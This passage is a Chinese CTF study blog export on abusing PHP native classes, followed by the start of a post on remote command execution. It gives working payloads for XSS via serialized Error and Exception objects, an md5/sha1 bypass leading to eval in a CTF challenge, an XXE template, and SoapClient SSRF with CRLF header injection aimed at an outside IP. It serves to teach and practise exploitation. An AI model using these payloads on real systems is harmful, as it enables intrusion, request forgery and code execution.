class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631676f9c.png" alt="image-20240313204731187"></p><p>文件已删除</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$zip</span> = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line"><span class="variable">$res</span> - <span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="string">&#x27;test.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">OVERWRITE</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>删除了test.zip文件，</p><p>ZipArchive::OVERWRITE：总是以一个新的压缩包开始，在此模式下如果已经存在则会被覆盖，这是一个常数项，值为8</p><h4 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h4><p>利用ReflectionMethod获取注释的内容</p><p>(PHP 5 &gt;&#x3D; 5.1.0, PHP 7, PHP 8)</p><p>ReflectionFunctionAbstract::getDocComment — 获取注释内容<br>由该原生类中的getDocComment方法可以访问到注释的内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span> = <span class="string">&#x27;orange&#x27;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    this is DocComment</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">type</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Apple&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ref</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="string">&quot;Apple&quot;</span>,<span class="string">&quot;type&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ref</span>-&gt;<span class="title function_ invoke__">getDocComment</span>());</span><br></pre></td></tr></table></figure><p>注释文本需符合&#x2F;**开头的规范否则无法识别</p><p><img src="https://bu.dusays.com/2024/05/13/66416315510f1.png" alt="image-20240313210010722"></p><p>ReflectionMethod(“Apple”,”type”);</p><p>在Apple类中type方法前的注释</p><h4 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h4><p><strong>Error</strong> 是所有PHP内部错误类的基类。 (PHP 7, 8)</p><p>在开启报错的情况下</p><p>**Error::__toString ** error 的字符串表达</p><p>类属性</p><ul><li>message 错误消息内容</li><li>code 错误代码</li><li>file 抛出错误的文件名</li><li>line 抛出错误的行数</li></ul><p>Error内置有一个__toString()的方法，可以产生<strong>xss</strong>漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>将第二个输出结果赋值给第一个代码的a</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313210909018.png" alt="image-20240313210909018"></p><p>返回 Error 的 string表达形式。</p><p><img src="https://bu.dusays.com/2024/05/13/6641631128b49.png" alt="image-20240313211614294"></p><h4 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h4><p>Exception与Error同理</p><p><strong>Exception</strong>是所有用户级异常的基类。 (PHP 5, 7, 8)</p><p>**Exception::__toString ** 将异常对象转换为字符串</p><p>类属性</p><ul><li>message 错误消息内容</li><li>code 错误代码</li><li>file 抛出错误的文件名</li><li>line 抛出错误的行数</li></ul><p>同样也有<strong>xss</strong>漏洞</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;text&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>同样将2赋值给1</p><p><img src="https://bu.dusays.com/2024/05/13/664163139aa2d.png" alt="image-20240313211434419"></p><p>返回转换为字符串（string）类型的异常。</p><p><img src="https://bu.dusays.com/2024/05/13/664163197c706.png" alt="image-20240313211519361"></p><h4 id="绕hash"><a href="#绕hash" class="headerlink" title="绕hash"></a>绕hash</h4><p>利用Error和Exception</p><p>先看一下输出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">4</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630dad872.png" alt="image-20240313212715298"></p><blockquote><p>Error: payload in &#x2F;box&#x2F;script.php:2<br>Stack trace:<br>#0 {main}<br>Error: payload in &#x2F;box&#x2F;script.php:3<br>Stack trace:<br>#0 {main}<br>Exception: payload in &#x2F;box&#x2F;script.php:4<br>Stack trace:<br>#0 {main}<br>Exception: payload in &#x2F;box&#x2F;script.php:6<br>Stack trace:<br>#0 {main}</p></blockquote><p>两个编译器编译后 对比发现这两个原生类返回的信息除了行号一模一样</p><p>利用这点，我们可以尝试进行hash函数的绕过，需要注意的是，必须将两个传入的对象放到同一行</p><p>因此我们可以进行简单的测试,发现使用此方法可以绕过hash强(弱)函数比较</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>!=<span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$a不等于$b&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5值相等\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sha1值相等&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313213054499.png" alt="image-20240313213054499"></p><p>没有问题</p><p>例：</p><p>[2020 极客大挑战]Greatphp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line"> </span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;&#125;<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><p>需要绕过两个hash强比较，且最终需要构造eval代码执行</p><p>显然正常方法是行不通的，而通过原生类可进行绕过</p><p>同样，当md5()和sha1()函数处理对象时，会自动调用__tostring方法</p><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line"> </span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> </span><br><span class="line">             <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line"> </span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">          </span><br><span class="line"> </span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">  &#125;&#125;<span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;<span class="comment">//两次取反绕过正则$a=new Error($str,1);</span></span><br><span class="line"> </span><br><span class="line">  <span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();<span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;<span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h4><p>SimpleXMLElement可解析XML 文档中的元素。 （PHP 5、PHP 7、PHP 8）</p><p>利用实例化该类的对象来传入xml代码进行<strong>xxe</strong>攻击，进而读取文件内容和命令执行</p><p>SimpleXMLElement::__construct — 创建一个新的 SimpleXMLElement 对象</p><p>参数：<br><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313213919494.png" alt="image-20240313213919494"></p><p>根据官方文档，发现当第三个参数为True时，即可实现远程xml文件载入，第二个参数的常量值设置为2即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;url&quot;&gt;%remote;]&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;xee&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$xml_clss</span>=<span class="keyword">new</span> <span class="title class_">SimpleXMLElement</span>(<span class="variable">$xml</span>,LIBXML_NOENT);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$xml_class</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>LIBXML_NOENT也是一个常数</p><p>参考赛题：[SUCTF 2018]Homework</p><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>SoapClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端，可以创建soap数据报文，与wsdl接口进行交互</p><p>soap：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOAP 是基于 XML 的简易协议，是用在分散或分布的环境中交换信息的简单的协议，可使应用程序在 HTTP 之上进行信息交换</span><br><span class="line"> </span><br><span class="line">SOAP是webService三要素（SOAP、WSDL、UDDI）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。</span><br><span class="line"> </span><br><span class="line">其采用HTTP作为底层通讯协议，XML作为数据传送的格式。</span><br></pre></td></tr></table></figure><p>soap扩展模块默认关闭，使用时需手动开启,php.ini配置文件里面开启extension&#x3D;php_soap.dll选项</p><p>SoapClient::__call —调用 SOAP 函数 (PHP 5, 7, 8)</p><p>通常，SOAP 函数可以作为SoapClient对象的方法调用</p><p>由此 可利用这个类进行ssrf</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br><span class="line"> </span><br><span class="line">第一个参数是用来指明是否是wsdl模式，如果为`null`，那就是非wsdl模式。</span><br><span class="line"> </span><br><span class="line">第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</span><br></pre></td></tr></table></figure><p>由此：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://xxx.xxx.xxx:3333/index.php&#x27;</span>, </span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;http://xxx.xxx.xxx:3333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;111111&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();<span class="comment">//$c-&gt;nofun(); </span></span><br><span class="line"><span class="comment">//随便调用对象中不存在的方法，触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313220612243.png" alt="image-20240313220612243"></p><p>监听：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631112ba6.png" alt="image-20240313220643842"></p><p>可以看到 SOAPAction和user_agent都可控</p><p>本地测试时发现，当使用此内置类(即soap协议)请求存在服务的端口时，会立即报错，而去访问不存在服务(未占用)的端口时，会等待一段时间报错，可以以此进行内网资产的探测。</p><p>同时还可以配合CRLF漏洞</p><p>可以通过 SoapClient 来控制其他参数或者post发送数据。例如:HTTP协议去攻击Redis</p><blockquote><p>CRLF：</p><p>HTTP报文的结构：状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。<br>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。<br>攻击者一旦向请求行或首部中的字段注入恶意的CRLF(\r\n)，就能注入一些首部字段或报文主体，并在响应中输出。</p></blockquote><p>通过结合CRLF，我们利用SoapClient+CRLF便可以干更多的事情，例如插入自定义Cookie，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://47.102.146.95:2333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;uri&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;111111\r\nCookie: PHPSESSION=dasdasd564d6as4d6a&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240313220940648.png" alt="image-20240313220940648"></p><p>发送POST的数据包，这里需要将Content-Type设置为application&#x2F;x-www-form-urlencoded，我们可以通过<strong>添加两个\r\n来将原来的Content-Type挤下去，自定义一个新的Content-Type</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://47.102.146.95:2333&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt;<span class="string">&#x27;uri&#x27;</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;111111\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: PHPSESSID=3stu05dr969ogmprk28drnju93\r\nContent-Length: 10\r\n\r\npostdata&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;<span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641631747fd8.png" alt="image-20240313221037193"></p><p>参考赛题：ctfshow上的题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line"> </span><br><span class="line">array_pop($xff);</span><br><span class="line"> </span><br><span class="line">$ip = array_pop($xff); //获取xff头</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if($ip!==&#x27;127.0.0.1&#x27;)&#123;</span><br><span class="line"> </span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line"> </span><br><span class="line">&#125;else&#123;</span><br><span class="line"> </span><br><span class="line">    $token = $_POST[&#x27;token&#x27;];</span><br><span class="line"> </span><br><span class="line">    if($token==&#x27;ctfshow&#x27;)&#123;</span><br><span class="line"> </span><br><span class="line">        file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 后端漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程命令执行</title>
      <link href="/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><strong>RCE</strong>漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p><p>后端漏洞</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一般出现这种漏洞，是因为<strong>应用系统从设计上需要给用户提供指定的远程命令操作的接口</strong>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><p><strong>在Web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞</strong></p><h2 id="系统命令执行函数"><a href="#系统命令执行函数" class="headerlink" title="系统命令执行函数"></a>系统命令执行函数</h2><blockquote><p>system()     能将字符串作为OS命令执行，且返回命令执行结果</p><p>passthru()   能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输</p><p>​             出到标准输出设备上         </p><p>shell_exec()    能将字符串作为OS命令执行</p><p>exec()     能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)</p><p>shell_exec()     能将字符串作为OS命令执行</p><p>popen()    打开进程文件指针</p><p>proc_open()    与popen()类似</p><p>pcntl_exec()    在当前进程空间执行指定程序</p></blockquote><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" 